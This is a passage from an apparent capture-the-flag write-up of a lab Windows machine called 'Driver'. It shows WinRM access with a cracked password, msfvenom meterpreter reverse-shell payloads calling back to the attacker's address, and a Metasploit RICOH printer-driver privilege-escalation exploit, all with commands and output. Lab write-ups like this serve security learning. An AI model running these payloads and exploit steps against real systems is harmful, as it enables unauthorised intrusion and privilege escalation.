+</span></span><span class=line><span class=cl>HTTP        10.10.11.106    <span class=m>5985</span>   DRIVER           <span class=o>[</span>*<span class=o>]</span> http://10.10.11.106:5985/wsman
+</span></span><span class=line><span class=cl>WINRM       10.10.11.106    <span class=m>5985</span>   DRIVER           <span class=o>[</span>+<span class=o>]</span> DRIVER<span class=se>\t</span>ony:liltony <span class=o>(</span>Pwn3d
+</span></span></code></pre></td></tr></table></div></div><p>We can use <strong><a href=https://github.com/Hackplayers/evil-winrm rel=noopener>evil-winrm</a></strong> to exploit this.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.10.11.106 -u tony -p liltony 
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\t</span>ony<span class=se>\D</span>ocuments&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Now we can use something like <strong><a href=https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS rel=noopener>winPEAS</a></strong> (by the way, <code>gobuster</code> finishes, nothing interesting unfortunaly).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\t</span>ony<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> <span class=se>\p</span>rogramdata
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\p</span>rogramdata&gt; upload exes/winPEASany.exe
+</span></span></code></pre></td></tr></table></div></div><p>We can see it has <code>RICOH</code> in it (from our <code>winPEAS</code> output):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>ll Users<span class=se>\R</span>ICOH_DRV<span class=se>\R</span>ICOH PCL6 UniversalDriver V4.23
+</span></span><span class=line><span class=cl>     C:<span class=se>\U</span>sers<span class=se>\A</span>ll Users<span class=se>\R</span>ICOH_DRV<span class=se>\R</span>ICOH PCL6 UniversalDriver V4.23<span class=se>\d</span>o_not_delete_folders
+</span></span><span class=line><span class=cl>     C:<span class=se>\U</span>sers<span class=se>\A</span>ll Users<span class=se>\R</span>ICOH_DRV<span class=se>\R</span>ICOH PCL6 UniversalDriver V4.23<span class=se>\_</span>com
+</span></span></code></pre></td></tr></table></div></div><p>Info about the exploit
+<a href=https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/ rel=noopener>here</a>.</p><p>So we don&rsquo;t need Administrator privilege to add a printer, just to add drivers. Therefore if the driver is there, we are all good. The <code>.dll</code> files are write-able by everyone.</p><p>Metasploit time!!!</p><p>We are going to use <code>exploit/windows/winrm/winrm_script_exe</code> with the following options:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/winrm/winrm_script_exec<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name       Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----       ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   DOMAIN     WORKSTATION      yes       The domain to use <span class=k>for</span> Windows authentification
+</span></span><span class=line><span class=cl>   FORCE_VBS  <span class=nb>false</span>            yes       Force the module to use the VBS CmdStager
+</span></span><span class=line><span class=cl>   PASSWORD   liltony          yes       A specific password to authenticate with
+</span></span><span class=line><span class=cl>   Proxies                     no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:port<span class=o>][</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>   RHOSTS     10.10.11.106     yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+</span></span><span class=line><span class=cl>   RPORT      <span class=m>5985</span>             yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
+</span></span><span class=line><span class=cl>   SSL        <span class=nb>false</span>            no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
+</span></span><span class=line><span class=cl>   SSLCert                     no        Path to a custom SSL certificate <span class=o>(</span>default is randomly generated<span class=o>)</span>
+</span></span><span class=line><span class=cl>   URI        /wsman           yes       The URI of the WinRM service
+</span></span><span class=line><span class=cl>   URIPATH                     no        The URI to use <span class=k>for</span> this exploit <span class=o>(</span>default is random<span class=o>)</span>
+</span></span><span class=line><span class=cl>   USERNAME   tony             yes       A specific username to authenticate as
+</span></span><span class=line><span class=cl>   VHOST                       no        HTTP server virtual host
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/x64/meterpreter/reverse_tcp<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   EXITFUNC  thread           yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh, thread, process, none<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LHOST     tun1             yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT     <span class=m>9001</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   Windows
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.12:9001 
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Login Failure. Recheck your credentials
+</span></span><span class=line><span class=cl>^C<span class=o>[</span>*<span class=o>]</span> Exploit completed, but no session was created.
+</span></span></code></pre></td></tr></table></div></div><p>Awww it doesn&rsquo;t work :(</p><p>Let&rsquo;s go for <code>msfvenom</code> then :)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.23 <span class=nv>LPORT</span><span class=o>=</span><span class=m>9001</span> -f exe -o msf.exe                                                                                                                          5m 14s
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
+</span></span><span class=line><span class=cl>Payload size: <span class=m>510</span> bytes
+</span></span><span class=line><span class=cl>Final size of exe file: <span class=m>7168</span> bytes
+</span></span><span class=line><span class=cl>Saved as: msf.exe
+</span></span></code></pre></td></tr></table></div></div><p>We then:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>upload exes/msf.exe
+</span></span></code></pre></td></tr></table></div></div><p>Go to <code>msfconsole</code> and run the <code>exploit/multi/handler</code> on port 9001:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Module options <span class=o>(</span>exploit/multi/handler<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name  Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----  ---------------  --------  -----------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>generic/shell_reverse_tcp<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name   Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----   ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   LHOST  10.10.14.12      yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT  <span class=m>9001</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   Wildcard Target
+</span></span></code></pre></td></tr></table></div></div><p>It worked!!!!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o><a class="internal-link broken"></span>msf<span class=o></a></span> exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt;&gt; run
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.12:9001 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>200774</span> bytes<span class=o>)</span> to 10.10.11.106
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.10.14.12:9001 -&gt; 10.10.11.106:49447<span class=o>)</span> at 2022-07-17 20:09:12 +0100
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 1<span class=o>)(</span>C:<span class=se>\p</span>rogramdata<span class=o>)</span> &gt;
+</span></span></code></pre></td></tr></table></div></div><p>We can background it then use the <code>ricoh_driver_privesc</code> exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/local/ricoh_driver_privesc<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name     Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----     ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   SESSION  <span class=m>1</span>                yes       The session to run this module on
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/x64/meterpreter/reverse_tcp<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   EXITFUNC  process          yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh, thread, process, none<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LHOST     tun1             yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT     <span class=m>4444</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   Windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o><a class="internal-link broken"></span>msf<span class=o></a></span> exploit<span class=o>(</span>windows/local/ricoh_driver_privesc<span class=o>)</span> &gt;&gt; run
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.12:4444 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Running automatic check <span class=o>(</span><span class=s2>&#34;set AutoCheck false&#34;</span> to disable<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The target appears to be vulnerable. Ricoh driver directory has full permissions
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Adding printer UjgJTcrEG...
+</span></span></code></pre></td></tr></table></div></div><p>And nothing happens :/</p><p>We can try with 32-bits, we do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.12 <span class=nv>LPORT</span><span class=o>=</span><span class=m>9001</span> -f exe -o msf32.exe      INT
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
+</span></span><span class=line><span class=cl>Payload size: <span class=m>354</span> bytes
+</span></span><span class=line><span class=cl>Final size of exe file: <span class=m>73802</span> bytes
+</span></span><span class=line><span class=cl>Saved as: msf32.exe
+</span></span></code></pre></td></tr></table></div></div><p>Then:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\p</span>rogramdata&gt; upload exes/msf32.exe
+</span></span></code></pre></td></tr></table></div></div><p>We listen in metasploit and run the file, don&rsquo;t forget to have the payload set for 32-bit not 64.</p><p>We then try our <strong>RICOH</strong> exploit again, but we still <strong>hang</strong>.</p><p>Let&rsquo;s try making our shell interactive. We go back to session 1 and run <code>ps</code> to list the services:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Meterpreter 1<span class=o>)(</span>C:<span class=se>\p</span>rogramdata<span class=o>)</span> &gt; ps
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Process <span class=nv>List</span>
+</span></span><span class=line><span class=cl><span class=o>============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> PID   PPID  Name                     Arch  Session  User         Path
+</span></span><span class=line><span class=cl> ---   ----  ----                     ----  -------  ----         ----
+</span></span><span class=line><span class=cl> <span class=m>0</span>     <span class=m>0</span>     <span class=o>[</span>System Process<span class=o>]</span>
+</span></span><span class=line><span class=cl> <span class=m>4</span>     <span class=m>0</span>     System
+</span></span><span class=line><span class=cl> <span class=m>264</span>   <span class=m>4</span>     smss.exe
+</span></span><span class=line><span class=cl> <span class=m>340</span>   <span class=m>332</span>   csrss.exe
+</span></span><span class=line><span class=cl> <span class=m>364</span>   <span class=m>948</span>   WUDFHost.exe
+</span></span><span class=line><span class=cl> <span class=m>448</span>   <span class=m>332</span>   wininit.exe
+</span></span><span class=line><span class=cl> <span class=m>456</span>   <span class=m>440</span>   csrss.exe
+</span></span><span class=line><span class=cl> <span class=m>500</span>   <span class=m>440</span>   winlogon.exe
+</span></span><span class=line><span class=cl> <span class=m>512</span>   <span class=m>4660</span>  msf32.exe                x86   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\P</span>rogramData<span class=se>\m</span>sf32.exe
+</span></span><span class=line><span class=cl> <span class=m>564</span>   <span class=m>448</span>   services.exe
+</span></span><span class=line><span class=cl> <span class=m>572</span>   <span class=m>448</span>   lsass.exe
+</span></span><span class=line><span class=cl> <span class=m>656</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>664</span>   <span class=m>512</span>   cmd.exe                  x86   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ysWOW64<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>704</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>816</span>   <span class=m>564</span>   sedsvc.exe
+</span></span><span class=line><span class=cl> <span class=m>820</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>828</span>   <span class=m>656</span>   explorer.exe             x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\e</span>xplorer.exe
+</span></span><span class=line><span class=cl> <span class=m>840</span>   <span class=m>500</span>   dwm.exe
+</span></span><span class=line><span class=cl> <span class=m>860</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>868</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>948</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>984</span>   <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1032</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1232</span>  <span class=m>564</span>   spoolsv.exe
+</span></span><span class=line><span class=cl> <span class=m>1360</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1452</span>  <span class=m>4660</span>  himum.exe                x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\P</span>rogramData<span class=se>\h</span>imum.exe
+</span></span><span class=line><span class=cl> <span class=m>1488</span>  <span class=m>656</span>   explorer.exe             x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\e</span>xplorer.exe
+</span></span><span class=line><span class=cl> <span class=m>1564</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1592</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1616</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1624</span>  <span class=m>564</span>   VGAuthService.exe
+</span></span><span class=line><span class=cl> <span class=m>1644</span>  <span class=m>564</span>   vm3dservice.exe
+</span></span><span class=line><span class=cl> <span class=m>1720</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>1728</span>  <span class=m>564</span>   vmtoolsd.exe
+</span></span><span class=line><span class=cl> <span class=m>1820</span>  <span class=m>1644</span>  vm3dservice.exe
+</span></span><span class=line><span class=cl> <span class=m>1836</span>  <span class=m>1452</span>  cmd.exe                  x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2056</span>  <span class=m>1452</span>  cmd.exe                  x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2076</span>  <span class=m>820</span>   cmd.exe                  x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2176</span>  <span class=m>656</span>   explorer.exe             x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\e</span>xplorer.exe
+</span></span><span class=line><span class=cl> <span class=m>2244</span>  <span class=m>564</span>   dllhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2292</span>  <span class=m>820</span>   taskhostw.exe            x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\t</span>askhostw.exe
+</span></span><span class=line><span class=cl> <span class=m>2404</span>  <span class=m>656</span>   WmiPrvSE.exe
+</span></span><span class=line><span class=cl> <span class=m>2500</span>  <span class=m>2076</span>  conhost.exe              x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2508</span>  <span class=m>1836</span>  conhost.exe              x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2540</span>  <span class=m>564</span>   msdtc.exe
+</span></span><span class=line><span class=cl> <span class=m>2716</span>  <span class=m>2076</span>  PING.EXE                 x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\P</span>ING.EXE
+</span></span><span class=line><span class=cl> <span class=m>2764</span>  <span class=m>2056</span>  conhost.exe              x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2768</span>  <span class=m>564</span>   SearchIndexer.exe
+</span></span><span class=line><span class=cl> <span class=m>2932</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>3036</span>  <span class=m>664</span>   conhost.exe              x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>3060</span>  <span class=m>820</span>   sihost.exe               x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\s</span>ihost.exe
+</span></span><span class=line><span class=cl> <span class=m>3284</span>  <span class=m>3256</span>  explorer.exe             x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\e</span>xplorer.exe
+</span></span><span class=line><span class=cl> <span class=m>3344</span>  <span class=m>656</span>   RuntimeBroker.exe        x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\R</span>untimeBroker.exe
+</span></span><span class=line><span class=cl> <span class=m>3648</span>  <span class=m>656</span>   ShellExperienceHost.exe  x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystemApps<span class=se>\S</span>hellExperienceHost_cw5n1h2txyewy<span class=se>\S</span>hellExperienceHost.exe
+</span></span><span class=line><span class=cl> <span class=m>3752</span>  <span class=m>656</span>   SearchUI.exe             x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystemApps<span class=se>\M</span>icrosoft.Windows.Cortana_cw5n1h2txyewy<span class=se>\S</span>earchUI.exe
+</span></span><span class=line><span class=cl> <span class=m>3920</span>  <span class=m>564</span>   svchost.exe              x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\s</span>vchost.exe
+</span></span><span class=line><span class=cl> <span class=m>4172</span>  <span class=m>564</span>   svchost.exe
+</span></span><span class=line><span class=cl> <span class=m>4660</span>  <span class=m>656</span>   wsmprovhost.exe          x64   <span class=m>0</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\w</span>smprovhost.exe
+</span></span><span class=line><span class=cl> <span class=m>4856</span>  <span class=m>3284</span>  vmtoolsd.exe             x64   <span class=m>1</span>        DRIVER<span class=se>\t</span>ony  C:<span class=se>\P</span>rogram Files<span class=se>\V</span>Mware<span class=se>\V</span>Mware Tools<span class=se>\v</span>mtoolsd.exe
